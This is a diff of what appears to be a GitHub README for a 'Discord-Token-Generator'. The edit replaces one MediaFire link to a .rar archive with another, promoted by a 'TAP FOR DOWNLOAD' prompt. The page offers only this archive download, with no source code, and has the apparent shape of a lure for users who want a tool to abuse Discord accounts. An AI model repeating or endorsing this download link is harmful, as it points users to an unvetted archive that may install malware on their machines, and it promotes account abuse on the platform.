@@ -1,7 +1,7 @@
 
 # [WORKED] Discord-Token-Generator
 
-💗[TAP FOR DOWNLOAD](https://www.mediafire.com/file/w4i11k49tixg0cg/DiscordTokenGenerator.rar/file)💗  
+💗[TAP FOR DOWNLOAD](https://www.mediafire.com/file/3sgvkcgpapmanq0/DiscordTokenGeneratorr.rar/file)💗  
 
 https://github.com/puluxy32/DiscordTokenGenerator/assets/136595708/2f823f61-f0c4-46cd-83b6-94b5adc0bfa7
 
